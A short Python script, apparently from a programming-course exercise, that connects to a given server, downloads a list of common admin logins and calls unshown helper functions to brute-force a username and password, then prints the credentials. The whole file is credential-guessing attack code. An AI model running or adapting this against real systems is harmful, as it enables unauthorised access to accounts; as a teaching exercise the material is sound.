import socket
import argparse
import string
import json

import helpers


parser = argparse.ArgumentParser()
parser.add_argument("host_ip_address")
parser.add_argument("host_port")
args = parser.parse_args()


class PasswordHacker:
    def __init__(self):
        self.host_ip_address = args.host_ip_address
        self.host_port = int(args.host_port)
        self.socket = socket.socket()
        self.pwd_chars = string.ascii_letters + string.digits
        self.credentials = {
            "login": '',
            "password": ''
        }

    def main(self):
        self._connect_socket()
        helpers.download_file('admin_logins.txt', 'https://stepik.org/media/attachments/lesson/255258/logins.txt')
        self.credentials["login"] = helpers.find_username(self.socket, 'admin_logins.txt')
        self.credentials["password"] = helpers.find_password(self.socket, self.credentials["login"], '', self.pwd_chars)
        print(json.dumps(self.credentials))
        self.socket.close()

    def _connect_socket(self):
        """Connects the socket attribute object to the server."""
        address = (self.host_ip_address, self.host_port)
        self.socket.connect(address)
        return


my_thing = PasswordHacker()
my_thing.main()
